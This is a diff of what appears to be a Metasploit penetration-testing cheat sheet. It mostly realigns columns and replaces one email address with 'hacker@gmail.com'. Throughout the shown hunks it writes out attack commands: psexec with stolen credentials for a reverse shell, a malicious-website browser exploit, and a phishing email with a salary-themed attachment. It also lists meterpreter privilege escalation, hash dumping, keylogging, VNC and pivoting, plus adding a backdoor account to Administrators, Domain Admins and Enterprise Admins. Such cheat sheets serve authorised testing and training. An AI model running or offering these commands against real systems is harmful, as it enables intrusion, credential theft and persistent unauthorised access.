@@ -19,7 +19,7 @@ root@kali:~# msfcli exploit/multi/samba/usermap_script P
 
 root@kali:~# msfconsole
 
-Entering 'help' or a '?' once in the msf command prompt will display available commands and their descriptions.
+help or ?                     List available commands and their descriptions.
 ------------------------------------------------------------------------------------------------------
 
 # Using Exploits
@@ -34,8 +34,7 @@ show evasion
 
 # Active Exploits
 
-Force an active module to the background.
-exploit -j
+exploit -j                    Force an active module to the background.
 
 Use a previously acquired set of credentials to exploit and gain a reverse shell on the target system. 
 use exploit/windows/smb/psexec
@@ -50,11 +49,8 @@ exploit
 
 # Passive Exploits
 
-Show active sessions.
-sessions -l
-
-Interact with session 2.
-sessions -i 2
+sessions -l                   Show active sessions.
+sessions -i 2                 Interact with session 2.
 
 Animated cursor vulnerability. The exploit does not fire until a victim browses to our malicious website. 
 use exploit/windows/browser/ani_loadimage_chunksize
@@ -168,7 +164,7 @@ set ExitOnSession false
 set LPORT 22
 exploit -j
  
-sendEmail -t ceo@target.com -f leebaird@gmail.com -s <targetIP> -u Salaries -a /root/Desktop/salaries.pdf
+sendEmail -t ceo@target.com -f hacker@gmail.com -s <targetIP> -u Salaries -a /root/Desktop/salaries.pdf
 ------------------------------------------------------------------------------------------------------
 
 # Pivoting
@@ -248,20 +244,20 @@ The command completed successfully.
 
 Post Exploitation using meterpreter
 
-run migrate                                       Create a new process and migrate to it.
-ps                                                Show running processes.
-sysinfo                                           Show host name and OS.
-getuid                                            Show current privileges.
+run migrate                                   Create a new process and migrate to it.
+ps                                            Show running processes.
+sysinfo                                       Show host name and OS.
+getuid                                        Show current privileges.
      if not NT AUTHORITY\SYSTEM
-     use priv                                     Escalate privileges.
+     use priv                                 Escalate privileges.
      getsystem
-     getuid                                       Privileges should now be NT AUTHORITY\SYSTEM
-screenshot                                        Take a photo of the desktop. 
-hashdump                                          Dump the password hashed.
-ipconfig                                          Look for dual-homed connections
+     getuid                                   Privileges should now be NT AUTHORITY\SYSTEM
+screenshot                                    Take a photo of the desktop. 
+hashdump                                      Dump the password hashed.
+ipconfig                                      Look for dual-homed connections
      if dual-homed
      run autoroute -s <new CIDR range>
-     run autoroute -p                             Print routing table.
+     run autoroute -p                         Print routing table.
 route
 ==========
 
@@ -280,15 +276,15 @@ add_group_user "Remote Access Users" hacker -h <target IP>
 Note: If the AV recognizes the file, your meterpreter session will end.
 Re-exploit the box and upload cachedump.exe.
 If upload is successful
-     shell                                        Drop into a Windows shell.
-     cd \                                         Change to root directory.
+     shell                                    Drop into a Windows shell.
+     cd \                                     Change to root directory.
 ==========
 
 idletime
      if time < 5 min
-     keyscan_start                                Start the keylogger.
-     keyscan_stop                                 Stop the keylogger.
-     keyscan_dump                                 Dump keystrokes.
+     keyscan_start                            Start the keylogger.
+     keyscan_stop                             Stop the keylogger.
+     keyscan_dump                             Dump keystrokes.
 
 run vnc
      if the screen is locked exit VNC
@@ -296,12 +292,12 @@ run vnc
 meterpreter > run get_application_list
 meterpreter > run winenum
 
-shell                                             Drop into a Windows shell.
+shell                                         Drop into a Windows shell.
 (from a Windows shell)
-net user                                          Show user accounts.
-net accounts                                      Show password policies.
-net user hacker password /add                     Add a new account called ciphent with the password ciphent.
-net localgroup Administrators hacker /add         Add the new account to the Administrators security group.
+net user                                      Show user accounts.
+net accounts                                  Show password policies.
+net user hacker password /add                 Add a new account called ciphent with the password ciphent.
+net localgroup Administrators hacker /add     Add the new account to the Administrators security group.
 net localgroup administrators
 ipconfig
 [take screen shot]
@@ -535,4 +531,3 @@ add_localgroup_user Administrators hacker -h <target IP>
  
 add_group_user "Domain Admins" hacker -h <target IP>
 add_group_user "Enterprise Admins" hacker -h <target IP>
- 
